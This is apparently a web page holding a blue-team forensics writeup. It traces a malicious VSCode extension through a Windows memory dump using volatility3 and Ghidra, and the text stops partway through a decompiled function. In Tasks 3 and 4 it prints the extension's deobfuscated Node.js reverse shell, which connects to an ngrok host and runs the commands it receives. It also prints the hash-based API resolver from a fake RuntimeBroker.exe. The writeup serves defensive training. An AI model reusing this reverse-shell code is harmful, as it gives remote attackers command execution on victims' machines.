@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>ReliableThreat - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/ReliableThreat.html" />
+    <!-- Sherlock-specific metadata for SEO -->
+    <meta name="description" content="Writeup for ReliableThreat sherlock - Medium difficulty level">
+    <meta name="keywords" content="Sherlock, ReliableThreat, Medium, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
+            <div class="sherlock-list" id="veasy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="sherlock-list" id="easy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="sherlock-list" id="medium-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="sherlock-list" id="hard-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="sherlock-list" id="insane-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">ReliableThreat</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty medium">Medium</span>
+            <span class="date">July 24, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Sherlock-specific content goes here -->
+                <p><img alt="solved" src="../images/ReliableThreat/solved.png" /></p>
+<h1>Task 1</h1>
+<p>I will start off by examining the memory dump. I'll be using volatility3 for this part, as I am already familiar with that tool.</p>
+<p>The first thing I'd like to do is get a look at the processes captured in this memdump. I'll run the <code>PsTree</code> module of volatility to get a list of them.</p>
+<p><code>python volatility3/vol.py -f memdump.dmp windows.pstree.PsTree</code></p>
+<p><img alt="suspicious" src="../images/ReliableThreat/suspicious.png" /></p>
+<p>This chain of processes initiated by Code.exe immediately caught my attention. The first one is spawned by explorer.exe, which is normal, but then the process with PID 1612 spawns a command prompt, which executes a very suspicious executable.</p>
+<p><code>C:\Windows\system32\cmd.exe /d /s /c "C:\Users\Public\RuntimeBroker.exe</code></p>
+<p>The real RuntimeBroker is located at <code>C:\WIndows\System32\RuntimeBroker.exe</code>. This fake one is most definitely some sort of a malicious program.</p>
+<p>That said, the application that started this suspicious chain of processes is <code>Code.exe</code>.</p>
+<p><img alt="task1" src="../images/ReliableThreat/task1.png" /></p>
+<h1>Task 2</h1>
+<p>Since the malicious command came from a Code.exe process, I'm leaning towards a malicious VSCode extension being used here.</p>
+<p>I'll get a list of all files residing in the memory dump using volatility.</p>
+<p><code>python volatility3/vol.py -f memdump.dmp windows.filescan.FileScan</code></p>
+<p>The exthost.log file records the runtime activity of installed extensions, including any errors, warnings, and other diagnostic output. At the very least, it could serve as a list of installed extensions.</p>
+<p><img alt="address" src="../images/ReliableThreat/address.png" /></p>
+<p>With the address in hand, I can extract the file to read its contents.</p>
+<p><code>python volatility3/vol.py -f memdump.dmp windows.dumpfiles.DumpFiles --virtaddr 0x850cd1c29c80</code></p>
+<p><img alt="extentions" src="../images/ReliableThreat/extensions.png" /></p>
+<p>This <code>0xS1rx58D3V.ChatGPT-B0T</code> extension looks very suspicious to me. I'll grep through the filescan output, searching for the extension name.</p>
+<p><img alt="search" src="../images/ReliableThreat/search.png" /></p>
+<p>I'll try to use <code>C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js</code> as my answer to task 2. This extension looks the most suspicious out of the listed ones.</p>
+<p><img alt="task2" src="../images/ReliableThreat/task2.png" /></p>
+<h1>Task 3</h1>
+<p>I already have the path, name, and address of the malicious plugin. I'd like to extract it to see what it contains.</p>
+<p><code>python volatility3/vol.py -f memdump.dmp windows.dumpfiles.DumpFiles --virtaddr 0x850cd2e704f0</code></p>
+<p><img alt="file" src="../images/ReliableThreat/file.png" /></p>
+<p>This code seems pretty normal. That is, until the <code>else if (userInput.toLowerCase().includes('help'))</code> check.</p>
+<p>This is followed by a suspiciously long line, containing values not present in other parts of the code.</p>
+<p>I took the obfuscated part and pasted it into an online deobfuscator at <code>https://obf-io.deobfuscate.io/</code>.</p>
+<p><img alt="obfuscation" src="../images/ReliableThreat/obfuscation.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+<span class="k">const</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s2">&quot;net&quot;</span><span class="p">);</span>
+<span class="k">const</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s2">&quot;path&quot;</span><span class="p">);</span>
+<span class="k">const</span><span class="w"> </span><span class="n">os</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">);</span>
+<span class="k">const</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">pid</span>
+<span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s2">&quot;process&quot;</span><span class="p">);</span>
+<span class="k">const</span><span class="w"> </span><span class="n">lockFilePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">homedir</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;.lock&quot;</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">fs</span><span class="o">.</span><span class="n">existsSync</span><span class="p">(</span><span class="n">lockFilePath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">fs</span><span class="o">.</span><span class="n">writeFile</span><span class="p">(</span><span class="n">lockFilePath</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">_0x2452ba</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_0x2452ba</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">_0x2452ba</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">});</span>
+<span class="w">  </span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">_0x3db126</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">net</span><span class="o">.</span><span class="n">Socket</span><span class="p">();</span>
+<span class="w">    </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="mi">16587</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;6.tcp.eu.ngrok.io&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">_0xd34d07</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">const</span><span class="w"> </span><span class="n">_0x45fcf2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_0xd34d07</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
+<span class="w">      </span><span class="n">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">_0x45fcf2</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">_0x460220</span><span class="p">,</span><span class="w"> </span><span class="n">_0x254585</span><span class="p">,</span><span class="w"> </span><span class="n">_0x3aa38b</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_0x460220</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_0x3aa38b</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_0x254585</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">});</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="w">    </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;close&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s2">&quot;closed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">/</span><span class="n">a</span><span class="o">/</span><span class="p">;</span>
+<span class="w">  </span><span class="p">})();</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This already gives me an answer for task 4, but first, I'll finish up task 3.</p>
+<p>The malicious portion of this script is executed when the user types in <code>help</code>.</p>
+<p><img alt="task3" src="../images/ReliableThreat/task3.png" /></p>
+<h1>Task 4</h1>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">_0x3db126</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">net</span><span class="o">.</span><span class="n">Socket</span><span class="p">();</span>
+<span class="w">    </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="mi">16587</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;6.tcp.eu.ngrok.io&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">_0xd34d07</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">const</span><span class="w"> </span><span class="n">_0x45fcf2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_0xd34d07</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
+<span class="w">      </span><span class="n">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">_0x45fcf2</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">_0x460220</span><span class="p">,</span><span class="w"> </span><span class="n">_0x254585</span><span class="p">,</span><span class="w"> </span><span class="n">_0x3aa38b</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_0x460220</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_0x3aa38b</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">_0x3db126</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_0x254585</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">});</span>
+<span class="w">    </span><span class="p">});</span><span class="w">  </span>
+</code></pre></div>
+
+<p>This function is responsible for establishing a connection to the attacker at <code>6.tcp.eu.ngrok.io:16587</code>. It then executes any commands sent by the attacker and sends back the received data and results.</p>
+<p>Most likely, the attacker used this to execute the malicious RuntimeBroker executable.</p>
+<p>I have not found any indicators of the RuntimeBroker being downloaded, which makes the possibility of an insider threat being the cause more realistic. For example, someone could've brought over the malware via a USB stick.</p>
+<p><img alt="task4" src="../images/ReliableThreat/task4.png" /></p>
+<h1>Task 5</h1>
+<p>To get the display name of the dev, I'll have to go back to volatility again.</p>
+<p>This information would usually be stored in a <code>package.json</code> file of the extension. I saw the file and its offset during my earlier operations, so I'll just copy it over from there.</p>
+<p><code>python volatility3/vol.py -f memdump.dmp windows.dumpfiles.DumpFiles --virtaddr 0x850cd16d92b0</code></p>
+<p><img alt="package" src="../images/ReliableThreat/package.png" /></p>
+<p>After opening the file in sublime text, I saw the dev's display name in the metadata section.</p>
+<p><img alt="name" src="../images/ReliableThreat/name.png" /></p>
+<p>I'll use it as my answer to task 5.</p>
+<p><img alt="task5" src="../images/ReliableThreat/task5.png" /></p>
+<h1>Task 6</h1>
+<p>The most accurate way to get an extension's release date would be the visual studio marketplace.</p>
+<p>Looking at a legitimate extension like <code>https://marketplace.visualstudio.com/items?itemName=WallabyJs.console-ninja</code>, I can replace the creator/extension name with my malicious ones to see whether it is still available.</p>
+<p><img alt="lost" src="../images/ReliableThreat/lost.png" /></p>
+<p>As expected, the extension is not available anymore. However, that doesn't mean it's lost forever.</p>
+<p>I'll go to the wayback machine, and I'll search for the same link over there. Maybe it has been archived?</p>
+<p><img alt="wayback" src="../images/ReliableThreat/wayback.png" /></p>
+<p>That was indeed the case. I'll pick the earlier date first.</p>
+<p><img alt="date" src="../images/ReliableThreat/date.png" /></p>
+<p>And here's the date. However, the website seems to take the timezone from my local configuration, which messes up the timestamp.</p>
+<p>To get the UTC date I need, I will take the <code>7/22/2024, 8:41:19 PM</code> date, and I'll add 4 hours to it. Additionally, I'll change the format to match the expected answer.</p>
+<p>With that, my final answer to task 6 will be <code>2024-07-23 0:41:19</code>.</p>
+<p><img alt="task6" src="../images/ReliableThreat/task6.png" /></p>
+<h1>Task 7</h1>
+<p>Judging by the earlier filepaths, the compromised user must be <code>User2</code>. I will grep the filelist for the <code>S-1-5-21</code> string. This should return me every entry that contains a SID.</p>
+<p><img alt="files" src="../images/ReliableThreat/files.png" /></p>
+<p>This <code>\Users\User2\AppData\Roaming\Microsoft\Protect\S-1-5-21-1998887770-13753423-1649717590-1001\Preferred</code> path at the bottom confirms the SID of User2.</p>
+<p><img alt="task7" src="../images/ReliableThreat/task7.png" /></p>
+<h1>Task 8</h1>
+<p>This suspicious executable is most definitely the RuntimeBroker I saw earlier.</p>
+<p>Its full path is <code>C:\Users\Public\RuntimeBroker.exe</code>, so I'll use that as my answer to task 8.</p>
+<p><img alt="task8" src="../images/ReliableThreat/task8.png" /></p>
+<h1>Task 9</h1>
+<p>I extracted RuntimeBroker in the same way as I did with the earlier files. I'll analyze it with ghidra to see exactly what this malware does.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">void</span><span class="w"> </span><span class="nt">entry</span><span class="o">(</span><span class="nt">undefined8</span><span class="w"> </span><span class="nt">param_1</span><span class="o">,</span><span class="nt">undefined8</span><span class="w"> </span><span class="nt">param_2</span><span class="o">,</span><span class="nt">undefined8</span><span class="w"> </span><span class="nt">param_3</span><span class="o">,</span><span class="nt">undefined8</span><span class="w"> </span><span class="nt">param_4</span><span class="o">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="err">longlong</span><span class="w"> </span><span class="err">lVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="err">byte</span><span class="w"> </span><span class="err">bVar2</span><span class="p">;</span>
+<span class="w">  </span><span class="err">longlong</span><span class="w"> </span><span class="err">lVar3</span><span class="p">;</span>
+<span class="w">  </span><span class="err">ulonglong</span><span class="w"> </span><span class="err">uVar4</span><span class="p">;</span>
+<span class="w">  </span><span class="err">undefined8</span><span class="w"> </span><span class="err">*puVar5</span><span class="p">;</span>
+<span class="w">  </span><span class="err">byte</span><span class="w"> </span><span class="err">*pbVar6</span><span class="p">;</span>
+<span class="w">  </span><span class="err">uint</span><span class="w"> </span><span class="err">uVar7</span><span class="p">;</span>
+<span class="w">  </span><span class="err">uint</span><span class="w"> </span><span class="err">uVar8</span><span class="p">;</span>
+<span class="w">  </span><span class="err">int</span><span class="w"> </span><span class="err">in_R10D</span><span class="p">;</span>
+
+<span class="w">  </span><span class="err">FUN_1400040d6()</span><span class="p">;</span>
+<span class="w">  </span><span class="err">puVar5</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">*(undefined8</span><span class="w"> </span><span class="err">**)(*(longlong</span><span class="w"> </span><span class="err">*)((longlong)ProcessEnvironmentBlock</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x18)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x20)</span><span class="p">;</span>
+<span class="w">  </span><span class="err">do</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="err">uVar4</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(ulonglong)*(ushort</span><span class="w"> </span><span class="err">*)((longlong)puVar5</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x4a)</span><span class="p">;</span>
+<span class="w">    </span><span class="err">uVar7</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">0</span><span class="p">;</span>
+<span class="w">    </span><span class="err">pbVar6</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(byte</span><span class="w"> </span><span class="err">*)puVar5</span><span class="cp">[</span><span class="mi">10</span><span class="cp">]</span><span class="p">;</span>
+<span class="w">    </span><span class="err">do</span><span class="w"> </span><span class="err">{</span>
+<span class="w">      </span><span class="err">bVar2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">*pbVar6</span><span class="p">;</span>
+<span class="w">      </span><span class="err">if</span><span class="w"> </span><span class="err">(&#39;`&#39;</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">(char)bVar2)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="err">bVar2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">bVar2</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">0x20</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="nt">uVar7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">uVar7</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nt">0xd</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">uVar7</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="nt">0x13</span><span class="o">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">(</span><span class="nt">uint</span><span class="o">)</span><span class="nt">bVar2</span><span class="o">;</span>
+<span class="w">      </span><span class="nt">uVar4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">uVar4</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">1</span><span class="o">;</span>
+<span class="w">      </span><span class="nt">pbVar6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">pbVar6</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">1</span><span class="o">;</span>
+<span class="w">    </span><span class="err">}</span><span class="w"> </span><span class="nt">while</span><span class="w"> </span><span class="o">(</span><span class="nt">uVar4</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nt">0</span><span class="o">);</span>
+<span class="w">    </span><span class="nt">lVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">puVar5</span><span class="cp">[</span><span class="mi">4</span><span class="cp">]</span><span class="o">;</span>
+<span class="w">    </span><span class="nt">lVar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">ulonglong</span><span class="o">)*(</span><span class="nt">uint</span><span class="w"> </span><span class="o">*)(</span><span class="nt">lVar1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x3c</span><span class="o">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">lVar1</span><span class="o">;</span>
+<span class="w">    </span><span class="nt">if</span><span class="w"> </span><span class="o">((*(</span><span class="nt">short</span><span class="w"> </span><span class="o">*)(</span><span class="nt">lVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x18</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nt">0x20b</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
+<span class="w">       </span><span class="o">(</span><span class="nt">uVar4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">ulonglong</span><span class="o">)*(</span><span class="nt">uint</span><span class="w"> </span><span class="o">*)(</span><span class="nt">lVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x88</span><span class="o">),</span><span class="w"> </span><span class="nt">uVar4</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nt">0</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="err">lVar3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">uVar4</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">lVar1</span><span class="p">;</span>
+<span class="w">      </span><span class="err">uVar4</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(ulonglong)*(uint</span><span class="w"> </span><span class="err">*)(lVar3</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x18)</span><span class="p">;</span>
+<span class="w">      </span><span class="err">while</span><span class="w"> </span><span class="err">(uVar4</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="err">0)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="err">uVar8</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">0</span><span class="p">;</span>
+<span class="w">        </span><span class="err">uVar4</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">uVar4</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">1</span><span class="p">;</span>
+<span class="w">        </span><span class="err">pbVar6</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(byte</span><span class="w"> </span><span class="err">*)((ulonglong)</span>
+<span class="w">                          </span><span class="err">*(uint</span><span class="w"> </span><span class="err">*)((ulonglong)*(uint</span><span class="w"> </span><span class="err">*)(lVar3</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x20)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">lVar1</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">uVar4</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="err">4)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">lVar1)</span>
+<span class="w">        </span><span class="p">;</span>
+<span class="w">        </span><span class="err">do</span><span class="w"> </span><span class="err">{</span>
+<span class="w">          </span><span class="err">bVar2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">*pbVar6</span><span class="p">;</span>
+<span class="w">          </span><span class="err">uVar8</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(uVar8</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="err">0xd</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">uVar8</span><span class="w"> </span><span class="err">&lt;&lt;</span><span class="w"> </span><span class="err">0x13)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">(uint)bVar2</span><span class="p">;</span>
+<span class="w">          </span><span class="err">pbVar6</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pbVar6</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">1</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">while</span><span class="w"> </span><span class="o">(</span><span class="nt">bVar2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nt">0</span><span class="o">);</span>
+<span class="w">        </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">uVar8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">uVar7</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nt">in_R10D</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="c">/* WARNING: Could not recover jumptable at 0x0001400040c8. Too many branches */</span>
+<span class="w">                    </span><span class="c">/* WARNING: Treating indirect jump as call */</span>
+<span class="w">          </span><span class="err">(*(code</span><span class="w"> </span><span class="err">*)((ulonglong)</span>
+<span class="w">                     </span><span class="err">*(uint</span><span class="w"> </span><span class="err">*)((ulonglong)*(uint</span><span class="w"> </span><span class="err">*)(lVar3</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x1c)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">lVar1</span><span class="w"> </span><span class="err">+</span>
+<span class="w">                              </span><span class="err">CONCAT62((int6)(uVar4</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="err">0x10),</span>
+<span class="w">                                       </span><span class="err">*(undefined2</span><span class="w"> </span><span class="err">*)</span>
+<span class="w">                                        </span><span class="err">((ulonglong)*(uint</span><span class="w"> </span><span class="err">*)(lVar3</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">0x24)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">lVar1</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">uVar4</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="err">2))</span><span class="w"> </span><span class="err">*</span>
+<span class="w">                              </span><span class="err">4)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">lVar1))(param_1,param_2,param_3,param_4)</span><span class="p">;</span>
+<span class="w">          </span><span class="err">return</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="err">}</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="w">    </span><span class="nt">puVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">undefined8</span><span class="w"> </span><span class="o">*)*</span><span class="nt">puVar5</span><span class="o">;</span>
+<span class="w">  </span><span class="err">}</span><span class="w"> </span><span class="nt">while</span><span class="o">(</span><span class="w"> </span><span class="nt">true</span><span class="w"> </span><span class="o">);</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<p>The main function operates like a dynamic module locator/hasher, searching for modules and their names via a ROR13 hash calculated during runtime, never mentioning any of them by name. Most likely, it was done to avoid AV and keep the malware stealthy.</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">void</span><span class="w"> </span><span class="nx">FUN_1400040d6</span><span class="p">(</span><span class="nx">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="nx">undefined8</span><span class="w"> </span><span class="nx">uVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">int</span><span class="w"> </span><span class="nx">iVar2</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">longlong</span><span class="w"> </span><span class="nx">lVar3</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">undefined8</span><span class="w"> </span><span class="nx">uVar4</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">code</span><span class="w"> </span><span class="o">*</span><span class="nx">UNRECOVERED_JUMPTABLE</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">undefined8</span><span class="w"> </span><span class="nx">uVar5</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">char</span><span class="w"> </span><span class="o">*</span><span class="nx">pcVar6</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">code</span><span class="w"> </span><span class="o">*</span><span class="nx">pcVar7</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">ulonglong</span><span class="w"> </span><span class="o">*</span><span class="nx">puVar8</span><span class="p">;</span>
